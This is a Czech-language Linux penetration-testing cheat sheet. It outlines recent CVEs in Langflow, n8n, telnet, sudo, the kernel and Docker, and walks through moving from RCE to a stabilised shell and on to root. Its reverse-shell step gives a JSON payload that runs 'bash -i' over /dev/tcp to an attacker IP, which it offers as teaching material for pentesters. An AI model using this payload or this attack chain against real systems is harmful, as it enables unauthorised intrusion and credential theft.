# 🐧 Linux Pentesting Cheat Sheet

---

# 🛠️ 1. Moderní Enumerace Linux Systémů

Moderní Linux enumerace už není pouze o:

```bash
nmap -sV
```

Dnes se zaměřuje na:

- API endpointy
- cloudové služby
- kontejnery
- moderní webové frameworky
- AI infrastrukturu

---

# 🔎 Identifikace technologií

## AI Stack Enumeration

Hledání služeb spojených s AI infrastrukturou:

Příklady:

- Langflow → AI orchestrace
- SGLang → AI inference služby

Možné cíle:

- API endpointy
- administrační rozhraní
- špatně zabezpečené služby

---

## Web Framework Fingerprinting

Identifikace moderních frameworků:

- Next.js
- React Server Components
- Node.js backendy

Důvod:

Moderní frameworky mohou obsahovat specifické chyby typu:

- Remote Code Execution (RCE)
- Server-Side Request Forgery (SSRF)
- Authentication Bypass

---

# ☣️ 2. Moderní Linux Útoky

---

# A) AI Orchestrace - Langflow RCE

## CVE-2025-3248

### Technologie:

```
Langflow
```

### Zranitelný endpoint:

```
/api/v1/validate/code
```

---

## Princip útoku

Útočník vloží škodlivý Python kód do dekorátorů.

Kód se vykoná během parsování ještě před samotným spuštěním funkce.

---

## Dopad

Útočník může získat:

- vzdálený shell
- API klíče
- cloud credentials

Například:

- AWS
- OpenAI
- Azure

---

# B) Supply Chain Attack - n8n Takeover

## CVE-2026-21858 (Ni8mare)

Technologie:

```
n8n Workflow Automation
```

---

## Princip

Chyba v manipulaci s:

```
Content-Type
```

umožňuje:

- neautentizované RCE
- spuštění příkazů na serveru

---

## Dopad

Kompromitace:

- Slack účtů
- GitHub tokenů
- databází
- interních služeb

Jeden exploit může znamenat převzetí celé automatizační infrastruktury.

---

# C) Telnet Authentication Bypass

## CVE-2026-24061

Cíl:

- IoT zařízení
- starší embedded Linux systémy

---

## Princip

Chyba umožňuje obejít autentizaci přes manipulaci s proměnnými prostředí.

Výsledkem může být:

```
root shell
```

---

# 🚀 3. Praktický postup: Od RCE k Shellu

Typický řetězec:

```
Identifikace služby
        ↓
Nalezení zranitelnosti
        ↓
RCE
        ↓
Reverse Shell
        ↓
TTY Upgrade
        ↓
Privilege Escalation
```

---

# Krok 1: Získání Reverse Shellu

Moderní aplikace často používají JSON payloady.

Příklad struktury:

```json
{
  "code": "import os; os.system('bash -i >& /dev/tcp/10.10.14.111/4444 0>&1')"
}
```

---

# Krok 2: Stabilizace TTY Shellu

Po získání shellu bývá terminál omezený:

Problémy:

- nefunguje TAB
- nefungují šipky
- problémy se sudo
- špatná práce s terminálem

---

## 1. Spawn TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 2. Pozastavení session

Stisk:

```
CTRL + Z
```

---

## 3. Nastavení terminálu

Na útočníkovi:

```bash
stty raw -echo
fg
```

Poté:

```bash
reset
```

---

## 4. Nastavení TERM

```bash
export TERM=xterm-256color
```

---

# 🔑 4. Privilege Escalation - Cesta k Rootu

Po získání uživatelského shellu následuje hledání způsobu získání root práv.

---

# 1. Kernel Exploity

Kontrolujeme:

- verzi kernelu
- distribuci
- dostupné exploity

Příklad:

```
CVE-2024-1086
```

Typ:

```
Kernel privilege escalation
```

---

# 2. Sudo Abuse

Kontrola sudo oprávnění:

```bash
sudo -l
```

---

Příklad kritické chyby:

```
CVE-2025-32463
```

Možnost:

```
User → Root
```

bez znalosti hesla.

---

# 3. Container Breakout

Pokud se nacházíš uvnitř Docker kontejneru:

Kontroluj:

```bash
id
```

```bash
cat /proc/1/cgroup
```

---

Cíl:

- Docker socket
- Docker Engine API
- špatné permissions

---

Příklad:

```
CVE-2025-9074
```

Dopad:

```
Container → Host Machine → Root
```

---

# 🧰 Linux Pentesting Workflow

```
1. Network Enumeration
        |
        ↓
2. Service Discovery
        |
        ↓
3. Web/API Enumeration
        |
        ↓
4. Exploit Research
        |
        ↓
5. Initial Access
        |
        ↓
6. Reverse Shell
        |
        ↓
7. TTY Upgrade
        |
        ↓
8. Privilege Escalation
        |
        ↓
9. Root Access
```

---

# 📌 Nejčastější Linux Post-Exploitation Nástroje

| Nástroj | Účel |
|---|---|
| LinPEAS | Automatická enumerace privilege escalation |
| pspy | Sledování procesů bez root práv |
| BloodHound | AD analýza vztahů |
| Chisel | Tunneling a pivoting |
| Netcat | Přenos dat a shelly |
| Python | Stabilizace shellu |
